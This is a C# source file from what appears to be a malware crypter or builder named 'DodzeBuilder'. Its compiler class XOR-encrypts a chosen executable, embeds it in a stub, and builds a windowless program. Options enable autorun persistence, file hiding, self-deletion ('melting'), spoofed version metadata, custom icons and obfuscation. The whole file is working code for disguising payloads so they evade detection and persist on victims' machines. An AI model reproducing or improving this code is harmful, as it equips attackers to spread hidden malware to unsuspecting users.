using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace DodzeBuilder.DodzeAlgorithms
{
    internal class Compilator
    {
        public static string PerformCompilate(string targetFile, string outPath, string IconFile, string AssemblyFile, 
            bool UseObfuscate, bool UseMelting, bool UseHiding, bool UseAutorun)
        {
            if (File.Exists(targetFile))
            {
                byte[] RandomXor = XorEncryptor.GenerateRandomBytes(32);

                byte[] bytePayload = XorEncryptor.EncryptFile(targetFile, RandomXor);

                File.Delete(targetFile);

                string result = CompileStub(bytePayload, RandomXor, outPath, IconFile, AssemblyFile,
                    UseObfuscate, UseMelting, UseHiding, UseAutorun);
                return result;
            }

            return "Failed to compile!\nFile does not exists. . .";
        }

        public static string CompileStub(byte[] encPayload, byte[] key, string outPath, string IconPath, string AssemblyTxt, 
            bool UseObfuscate, bool UseMelting, bool UseHiding, bool UseAutorun)
        {
            string stubSourceCode = Properties.Resources.stub;

            string hexArray = XorEncryptor.GenerateHexArray(encPayload);

            stubSourceCode = Regex.Replace(
                stubSourceCode,
                @"public static byte\[\] Payload = new byte\[\] \{.*?\};",
                "public static byte[] Payload = " + hexArray,
                RegexOptions.Singleline
            );

            string newKey = "public static byte[] Key = new byte[] { " + string.Join(", ", key.Select(b => "0x" + b.ToString("X2"))) + " };";
            stubSourceCode = Regex.Replace(
                stubSourceCode,
                @"public static byte\[\] Key = new byte\[\] \{.*?\};",
                newKey,
                RegexOptions.Singleline
            );

            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = outPath,
                CompilerOptions = "/platform:AnyCPU /target:winexe",
                IncludeDebugInformation = false
            };

            if (!string.IsNullOrEmpty(AssemblyTxt) && File.Exists(AssemblyTxt))
            {
                parameters.CompilerOptions += " /define:UseAssembly";
                var metadata = File.ReadAllLines(AssemblyTxt);

                string title = metadata.Length > 0 ? metadata[0] : "N/A";
                string description = metadata.Length > 1 ? metadata[1] : "N/A";
                string company = metadata.Length > 2 ? metadata[2] : "N/A";
                string product = metadata.Length > 3 ? metadata[3] : "N/A";
                string copyright = metadata.Length > 4 ? metadata[4] : "N/A";
                string trademarks = metadata.Length > 5 ? metadata[5] : "N/A";
                string fileVersion = metadata.Length > 6 ? metadata[6] : "N/A";
                string productVersion = metadata.Length > 7 ? metadata[7] : "N/A";

                stubSourceCode = stubSourceCode.Replace("%TITLE%", title);
                stubSourceCode = stubSourceCode.Replace("%DESC%", description);
                stubSourceCode = stubSourceCode.Replace("%COMPANY%", company);
                stubSourceCode = stubSourceCode.Replace("%PRODUCT%", product);
                stubSourceCode = stubSourceCode.Replace("%COPYRIGHT%", copyright);
                stubSourceCode = stubSourceCode.Replace("%TRADEMARK%", trademarks);
                stubSourceCode = stubSourceCode.Replace("%VERSION%", productVersion);
                stubSourceCode = stubSourceCode.Replace("%FILE_VERSION%", fileVersion);
            }

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
            parameters.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.Linq.dll");


            if (!string.IsNullOrEmpty(IconPath) && File.Exists(IconPath))
            {
                parameters.CompilerOptions += $" /win32icon:\"{IconPath}\"";
            }

            if (UseAutorun)
            {
                parameters.CompilerOptions += " /define:Autorun";
            }

            if (UseHiding)
            {
                parameters.CompilerOptions += " /define:HideFile";
            }

            if (UseMelting)
            {
                parameters.CompilerOptions += " /define:MeltFile";
            }

            using (CSharpCodeProvider codeProvider = new CSharpCodeProvider())
            {
                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, stubSourceCode);

                if (results.Errors.Count > 0)
                {
                    foreach (CompilerError error in results.Errors)
                    {
                        Console.WriteLine($"Error compilation: {error.ErrorText}");
                        Console.WriteLine($"File: {error.FileName}");
                        Console.WriteLine($"String: {error.Line}, Column: {error.Column}");
                        Console.WriteLine($"ID Error: {error.ErrorNumber}");
                        Console.WriteLine($"This {(error.IsWarning ? "Warning" : "Error")}");
                        Console.WriteLine(new string('-', 50));
                    }
                    throw new InvalidOperationException("Failed to compilate.");
                }
            }
            if (UseObfuscate)
            {
                Obfuscator.PerformObfuscation(outPath);

            }
            return "Compiling successfull!";
        }
    }
}
